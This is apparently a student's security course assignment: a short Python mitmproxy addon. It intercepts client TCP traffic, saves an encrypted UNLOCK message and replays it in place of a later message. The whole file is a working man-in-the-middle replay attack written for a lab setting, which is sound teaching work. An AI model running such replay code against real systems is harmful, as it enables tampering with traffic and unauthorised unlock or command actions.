# Zohaib Umer | 23i-0528 | CS3002 Assignment 2
from mitmproxy import tcp
import logging

# Separate state for each TCP connection
sessions = {}

def tcp_message(flow: tcp.TCPFlow):
    msg = flow.messages[-1]

    if not msg.from_client:
        return

    sid = flow.id
    state = sessions.setdefault(sid, {
        "buffer": b"",
        "count": 0,
        "saved_unlock": None,
    })

    state["buffer"] += msg.content
    output = b""

    while b"\n" in state["buffer"]:
        line, state["buffer"] = state["buffer"].split(b"\n", 1)
        line += b"\n"

        if b"type:MSG" in line:
            state["count"] += 1
            number = state["count"]

            if number == 2:
                state["saved_unlock"] = line
                logging.warning(
                    "C-A5: Saved encrypted UNLOCK record"
                )

            elif number == 3 and state["saved_unlock"]:
                line = state["saved_unlock"]
                logging.warning(
                    "C-A5: Replayed previous UNLOCK record"
                )

        output += line

    msg.content = output


def tcp_end(flow: tcp.TCPFlow):
    sessions.pop(flow.id, None)

